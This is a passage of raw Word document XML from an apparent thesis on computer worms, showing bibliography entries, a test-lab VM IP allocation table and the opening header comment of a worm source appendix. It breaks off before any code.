          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Syslog</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Messages.</w:t>
      </w:r>
      <w:r w:rsidR="00172E51">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Internet Engineering Task Force (IETF):  May 2010. Accessed: 6 Apr</w:t>
      </w:r>
      <w:r w:rsidR="004D2F06">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&lt;http://tools.ietf.org/html/rfc5848&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00BB6D78">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Schneier, Bruce. “Benevolent Worms.” </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Crypto-Gram Newsletter</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00BB6D78">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Schneier.com: 1</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">5 Sep. 2003. </w:t>
      </w:r>
      <w:r w:rsidR="00BB6D78">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Accessed: </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>26 Aug. 2011. &lt;http://www.schneier.com/crypto-gram-0309.html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00BC776B">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Schneier, Bruce. “The Storm Worm.” </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Schneier on Security</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00BC776B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Schneier.com: </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">4 Oct. 2007. </w:t>
      </w:r>
      <w:r w:rsidR="00BC776B">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Accessed: </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>26 Aug. 2011. &lt;http://www.schneier.com/blog/archives/2007/10/the_storm_worm.html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00B30124">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Schneier, Bruce. “Hijacking the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Coreflood</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Botnet.” </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Schneier on Security</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidR="00B30124">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Schneier.com: </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>2 May 2011. 26 Aug. 2011. &lt;http://www.schneier.com/blog/archives/2011/05/hijacking_the_c.html&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00595620">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SecurityFocus</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “Microsoft Windows DCOM RPC Interface Buffer Overrun Vulnerability.”</w:t>
      </w:r>
      <w:r w:rsidR="001D6396">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00595620">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>SecurityFocus</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00595620">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="001D6396">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>11 Jul</w:t>
      </w:r>
      <w:r w:rsidR="00595620">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="001D6396">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2009.</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Accessed: 14 Mar. 2012. &lt;http://www.securityfocus.com/bid/8205/info&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00B965D6">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Shannon, Colleen. “The Spread of the Witty Worm.” Malware Recon. IEEE Security &amp; Privacy. IEEE: Jul</w:t>
      </w:r>
      <w:r w:rsidR="00B965D6">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2004. Accessed: 23 Jan</w:t>
      </w:r>
      <w:r w:rsidR="005C3795">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w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="006D7E7D">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von Neumann, John and Arthur W. Burks, ed. </w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Theory of Self-Reproducing Automata</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. Urbana: University of Illinois Press, 1966.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00020E41">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720" w:hanging="720"/>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 xml:space="preserve">Weaver, Nicholas, Vern </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Paxson</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, Stuart </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Staniford</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, Robert Cunningham. “A Taxonomy of Computer Worms.” WORM’03. Washington, D.C.: ACM, 27 Oct. 2003.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00020E41">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:left="720" w:hanging="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Zetter</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>, Kim. “Bank Not Responsible for Letting Hackers Steal $300K From Customer.” Threat Level. Wired: 7 Jun</w:t>
      </w:r>
      <w:r w:rsidR="009A5366">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2011. Accessed: 6 Apr</w:t>
      </w:r>
      <w:r w:rsidR="009A5366">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2012. &lt;</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>http://www.wired.com/threatlevel/2011/06/bank-ach-theft/</w:t>
      </w:r>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pP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CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00EF35C4">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="42" w:name="_Toc321736807"/>
      <w:r w:rsidRPr="00861880">
        <w:lastRenderedPageBreak/>
        <w:t>Appendix A - Test environment network diagram</w:t>
      </w:r>
      <w:bookmarkEnd w:id="42"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00B41FF9" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0">
            <wp:extent cx="5762625" cy="43243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CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00EF35C4">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="43" w:name="_Toc321736808"/>
      <w:r w:rsidRPr="00861880">
        <w:lastRenderedPageBreak/>
        <w:t>Appendix B - IP allocation range used for test VMs</w:t>
      </w:r>
      <w:bookmarkEnd w:id="43"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:line="48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14"/>
        <w:gridCol w:w="1635"/>
        <w:gridCol w:w="3111"/>
      </w:tblGrid>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632992" w:rsidRDefault="00CB26A3" w:rsidP="00632992">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00632992">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>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632992" w:rsidRDefault="00CB26A3" w:rsidP="00632992">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00632992">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>32/64-bit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632992" w:rsidRDefault="00CB26A3" w:rsidP="00632992">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00632992">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:b/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>IP (192.168.0.0/24)</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192.168.0.150</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192.168.0.151</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192.168.0.152</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192.168.0.153</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192.168.0.154</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192.168.0.155</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192.168.0.156</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192.168.0.157</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192.168.0.158</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192.168.0.159</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192.168.0.160</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192.168.0.161</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192.168.0.162</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192.168.0.163</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192.168.0.164</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192.168.0.165</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192.168.0.166</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192.168.0.167</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192.168.0.168</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192.168.0.169</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192.168.0.170</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192.168.0.171</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lastRenderedPageBreak/>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192.168.0.172</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192.168.0.173</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192.168.0.174</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192.168.0.175</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192.168.0.176</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7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192.168.0.177</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7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192.168.0.178</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192.168.0.179</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192.168.0.180</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192.168.0.181</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192.168.0.182</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Vista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192.168.0.183</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Vista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192.168.0.184</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192.168.0.185</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Server 2003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192.168.0.186</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>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Windows Server 2003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632992">
            <w:pPr>
              <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00861880">
              <w:rPr>
                <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>192.168.0.187</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00632992">
      <w:pPr>
        <w:spacing w:after="0" w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="003D2C00" w:rsidRPr="00861880" w:rsidRDefault="003D2C00" w:rsidP="00B63226">
      <w:pPr>
        <w:spacing w:after="0" w:line="480" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="00EF35C4">
      <w:pPr>
        <w:pStyle w:val="TH1"/>
      </w:pPr>
      <w:bookmarkStart w:id="44" w:name="_Toc321736809"/>
      <w:r w:rsidRPr="00861880">
        <w:lastRenderedPageBreak/>
        <w:t>Appendix C - Important sections of source code for worm</w:t>
      </w:r>
      <w:bookmarkEnd w:id="44"/>
    </w:p>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00CB26A3" w:rsidP="009B2D4D">
      <w:pPr>
        <w:spacing w:line="24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60"/>
      </w:tblGrid>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B2D4D">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shd w:val="solid" w:color="E9E8E2" w:fill="E9E8E2"/>
              </w:rPr>
              <w:t>ThesisWorm.cpp</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00CB26A3" w:rsidRPr="00861880" w:rsidRDefault="00D2596C" w:rsidP="009B2D4D">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>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t xml:space="preserve">1 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="E9EFF8" w:fill="E9EFF8"/>
        </w:rPr>
        <w:t>//=====================================================</w:t>
      </w:r>
      <w:r w:rsidR="00394036">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="E9EFF8" w:fill="E9EFF8"/>
        </w:rPr>
        <w:t>==</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="E9EFF8" w:fill="E9EFF8"/>
        </w:rPr>
        <w:t>==========</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  2 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Name        : ThesisWorm.cpp</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  3 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Author      : Rodney Beede</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  4 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="969696"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>// Version     :</w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:shd w:val="solid" w:color="FFFFFF" w:fill="FFFFFF"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">  5 </w:t>
      </w:r>
      <w:r w:rsidR="00CB26A3" w:rsidRPr="00861880">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Arial" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
